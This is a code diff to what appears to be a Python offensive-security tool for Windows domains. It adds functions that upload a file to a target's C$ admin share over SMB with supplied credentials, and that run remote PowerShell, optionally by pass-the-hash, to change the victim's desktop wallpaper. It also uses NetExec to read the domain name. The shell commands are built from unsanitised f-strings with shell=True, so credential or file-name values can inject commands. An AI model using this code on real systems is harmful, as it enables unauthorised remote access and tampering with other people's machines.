@@ -2,9 +2,11 @@ import subprocess
 import re
 import os
 import sys
-from typing import List, Set
+from colored import Fore, Style
+from typing import List, Set, Optional
 import socket
 from pathlib import Path
+from ..Modules.run_modules import run_command, execute_powershell
 
 def auth_was_successful(output: str) -> bool:
     if "[+]" in output:
@@ -12,23 +14,13 @@ def auth_was_successful(output: str) -> bool:
             return False
         return True
     return False
-
-def run_command(cmd: List[str], check: bool = False, print_output=True) -> str:
-    """Run a command, return output """
-    try:
-        result = subprocess.run(cmd, capture_output=True, text=True, check=check)
-        output = result.stdout + result.stderr
-        if print_output:
-            print(output)
-        return output
-    except subprocess.CalledProcessError as e:
-        output = e.stdout + e.stderr
-        print(output)
-        return output
-    except Exception as e:
-        print(f"Error running command: {e}")
-        return ""
     
+def place_item(user: str, password: str, ip: str, item: str) -> None:
+    smb_command = f"smbclient //{ip}/C$ -U {user}%'{password}' -c 'put {item} Users\\{user}\\Documents\\{item}'"
+    output = subprocess.run(smb_command, shell=True, capture_output=True)
+    print(f"{Fore.green}[+] {item} placed in Users\\{user}\\Documents\\{item}")
+    print(Style.reset)
+
 def get_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -140,3 +132,19 @@ def find_user(domain: str, ip: str, user_list) -> None:
 def get_domain(ip) -> str:
     domain = subprocess.run([f"nxc smb {ip} | awk '{{print $13}}' | sed 's/(domain://g' | sed 's/)//g'"], shell=True, capture_output=True, text=True)
     return domain.stdout.strip()
+
+
+def update_wallpaper(username: str, password: str, ip: str, domain: str, item: str, use_hash: Optional[bool] = False) -> None:
+    place_item(username, password, ip, item)
+    wallpaper_path = f"C:\\Users\\{username}\\Documents\\{item}"
+    cmd = (
+        f'Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop"'
+        f'-Name WallPaper -Value "{wallpaper_path}";'
+        f'RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters'
+    )
+    success, output = execute_powershell(ip, username, password, domain, cmd, use_hash)
+    if success:
+        print(f"{Fore.green}[+] Wallpaper changed successfully")
+        print()
+    else:
+        print(f"{Fore.red}[-] An error occured")
